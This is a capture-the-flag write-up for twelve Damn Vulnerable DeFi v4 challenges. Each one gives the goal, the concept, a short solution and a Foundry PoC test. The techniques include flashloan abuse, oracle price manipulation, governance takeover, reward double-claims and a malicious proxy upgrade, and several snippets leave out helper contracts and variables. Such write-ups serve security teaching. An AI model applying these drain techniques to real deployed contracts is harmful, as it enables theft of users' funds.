# Damn Vulnerable DeFi v4 Writeup
by tinamints

## 1. Unstoppable
### conditions :
-  halt the vault
### concepts :
-  flashloan
-  DOS
### solution : 
- send token via 'deposit' function to make `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();` true because totalSupply' only changes when someone send token via 'deposit function
### POC
` function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 1);
    }
`

## 2. Naive receiver
### conditions :
- rescue all funds in the flashloan pool
- complete the challenge in less than 2 transactions
### concepts :
-  flashloan
### solution : 
- set the reciever as the tarket to pay fee and imposonate the feeReceiver to withdraw the accumulated WETH 
### POC
` function test_naiveReceiver() public checkSolvedByPlayer {
    
        bytes[] memory data = new bytes[](10);
        for (uint256 i = 0; i < 10; i++) {
            data[i] = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver), 
                address(weth),
                0, 
                ""
            );
        }
       
        pool.multicall(data);

        
        vm.startPrank(address(deployer));
        pool.withdraw(weth.balanceOf(address(pool)), payable(recovery));
        vm.stopPrank();
       
    }`

## 3. Truster
### conditions :
- rescue all funds to the recovery
- complete the challenge with 1 transaction
### concepts :
-  flashloan
-  unchecked argument
### solution : 
- set 'target'=pool and call 'approve' on it to approve the attacker on its token
### POC
`function test_truster() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(pool, recovery, token, TOKENS_IN_POOL);
        attacker.attack();

    }`

## 4. Side Entrance
### conditions :
- rescue all funds and transfer to then recovery account with 1 ETH
### concepts :
-  flashloan with collateral
### solution :
- take an advantage of  `execute` being called during the flashloan  to deposit to the pool and get `balance` and get the right to call `withdraw`
### POC
` function test_sideEntrance() public checkSolvedByPlayer {
        SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);

        exploit.exploit();

    }

`

## 5. The Rewarder
### conditions :
- save as much funds as possible and transfer to the recovery account
- have to be in the beneficiaries to interact with the distributor
### concepts :
-  restricted distribution 
-  merkle tree system
### solution :
- take the advantage of the fact that the distributor doesn't check `claimRewards()` when claim the same token and claim the same token multiple times
### POC
` function test_theRewarder() public checkSolvedByPlayer {
        
        string memory dvtJson = vm.readFile(
            "test/the-rewarder/dvt-distribution.json"
        );
        Reward[] memory dvtRewards = abi.decode(
            vm.parseJson(dvtJson),
            (Reward[])
        );
        
        string memory wethJson = vm.readFile(
            "test/the-rewarder/weth-distribution.json"
        );
        Reward[] memory wethRewards = abi.decode(
            vm.parseJson(wethJson),
            (Reward[])
        );
        
        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );

        
        uint256 playerDvtAmount;
        bytes32[] memory playerDvtProof;
        uint256 playerWethAmount;
        bytes32[] memory playerWethProof;
        
        for (uint i = 0; i < dvtRewards.length; i++) {
            if (dvtRewards[i].beneficiary == player) {
                playerDvtAmount = dvtRewards[i].amount;
                playerWethAmount = wethRewards[i].amount;
                playerDvtProof = merkle.getProof(dvtLeaves, i);
                playerWethProof = merkle.getProof(wethLeaves, i);
                break;
            }
        }
        require(playerDvtAmount > 0, "Player not found in DVT distribution");
        require(playerWethAmount > 0, "Player not found in WETH distribution");

        
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        
        uint256 totalClaimsNeeded = (TOTAL_DVT_DISTRIBUTION_AMOUNT /
            playerDvtAmount) +
            (TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount);
        uint256 dvtClaims = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount;
        Claim[] memory claims = new Claim[](totalClaimsNeeded);

        
        for (uint256 i = 0; i < totalClaimsNeeded; i++) {
            claims[i] = Claim({
                batchNumber: 0,
                amount: i < dvtClaims ? playerDvtAmount : playerWethAmount,
                tokenIndex: i < dvtClaims ? 0 : 1,
                proof: i < dvtClaims ? playerDvtProof : playerWethProof
            });
        }

        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));

    }`

## 6. Selfie
### conditions :
- drain all tokens from the pool to recovery
### concepts :
-  flashloan
-  governance voting power
### solution :
- flashloan the pool tokens to temporarily gain majority voting power, queue `emergencyExit` as a governance action, repay the loan, wait 2 days, execute the action
### POC
` function test_selfie() public checkSolvedByPlayer {
        pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");
        vm.warp(block.timestamp + 2 days);
        governance.executeAction(1);
    }
`

## 7. Compromised
### conditions :
- drain all ETH from exchange to recovery
- player must not own any NFT
- NFT price must remain unchanged
### concepts :
-  oracle price manipulation
-  leaked private keys
### solution :
- decode leaked private keys (from README hex strings) of 2 oracle sources, set NFT price to 0, buy for 1 wei, restore price to 999 ETH, sell NFT, send ETH to recovery
### POC
` function test_compromised() public checkSolved {
        vm.prank(source1); oracle.postPrice("DVNFT", 0);
        vm.prank(source2); oracle.postPrice("DVNFT", 0);
        vm.startPrank(player);
        uint256 nftId = exchange.buyOne{value: 1 wei}();
        nft.approve(address(exchange), nftId);
        vm.stopPrank();
        vm.prank(source1); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.prank(source2); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.startPrank(player);
        exchange.sellOne(nftId);
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }
`

## 8. Puppet
### conditions :
- drain all 100k DVT from lending pool to recovery
- complete in 1 transaction
### concepts :
-  Uniswap V1 oracle price manipulation
-  EIP-2612 permit
### solution :
- dump player's 1000 DVT into Uniswap V1 to crash the token price, making `calculateDepositRequired` near zero, then borrow all pool tokens in 1 tx using permit for token approval
### POC
` function test_puppet() public checkSolvedByPlayer {
        PuppetPoolAttacker attacker = new PuppetPoolAttacker(
            address(token), address(lendingPool), address(uniswapV1Exchange), recovery
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
        attacker.attack{ value: 25 ether }(player, deadline, v, r, s);
    }
`

## 9. Puppet V2
### conditions :
- drain all 1M DVT from lending pool to recovery
### concepts :
-  Uniswap V2 oracle price manipulation
-  WETH collateral
### solution :
- sell all 10k player tokens into Uniswap V2 to crash DVT price, then borrow 1M pool tokens with the now-minimal WETH collateral required
### POC
` function test_puppetV2() public checkSolvedByPlayer {
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETH(tokensToSell, 0, path, player, block.timestamp + 1);
        uint256 requiredWETH = lendingPool.calculateDepositOfWETHRequired(poolTokens);
        weth.deposit{value: ethBalance}();
        weth.approve(address(lendingPool), requiredWETH);
        lendingPool.borrow(poolTokens);
        token.transfer(recovery, token.balanceOf(player));
    }
`

## 10. Free rider
### conditions :
- drain all 6 NFTs from marketplace
- player earns the bounty (45 ETH)
### concepts :
-  Uniswap V2 flashloan
-  NFT marketplace buy logic bug
### solution :
- flashloan 15 ETH (price of 1 NFT). marketplace bug: only checks `msg.value >= price` once but allows buying all 6, and sends ETH to the buyer instead of the seller. buy all 6 for 15 ETH, transfer to recoveryManager to claim 45 ETH bounty
### POC
` function test_freeRider() public checkSolvedByPlayer {
        flashLoanUser attacker = new flashLoanUser(
            address(marketplace), address(recoveryManager), address(nft),
            address(uniswapPair), address(token), address(weth), address(player)
        );
        attacker.flashLoanInitilizer(15 ether);
    }
`

## 11. Backdoor
### conditions :
- drain all 40 DVT to recovery
- complete in 1 transaction
### concepts :
-  Safe proxy factory
-  arbitrary call injection during setup
### solution :
- use `createProxyWithCallback`'s `initializer` field to inject an `approve` call during Safe's `setup()`. WalletRegistry sends 10 DVT to the new wallet, attacker immediately `transferFrom` the tokens. repeat for all 4 users
### POC
` function test_backdoor() public checkSolvedByPlayer {
        new Attacker(
            address(walletFactory), address(singletonCopy),
            address(walletRegistry), address(token), recovery, users
        );
    }
`

## 12. Climber
### conditions :
- drain all 10M DVT from vault to recovery
### concepts :
-  timelock execute-before-schedule bug
-  UUPS proxy upgrade
### solution :
- `execute()` runs actions before checking if they're scheduled. execute a batch: set delay to 0, grant proposer role to attacker, upgrade vault to malicious impl, retroactively `schedule` the batch from inside the callback. then call `sweepFunds` on the upgraded vault
### POC
` function test_climber() public checkSolvedByPlayer {
        MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();
        ClimberAttack attackContract = new ClimberAttack(
            payable(address(vault)), payable(address(timelock)), recovery, address(token)
        );
        attackContract.attack(address(maliciousImpl));
    }
`

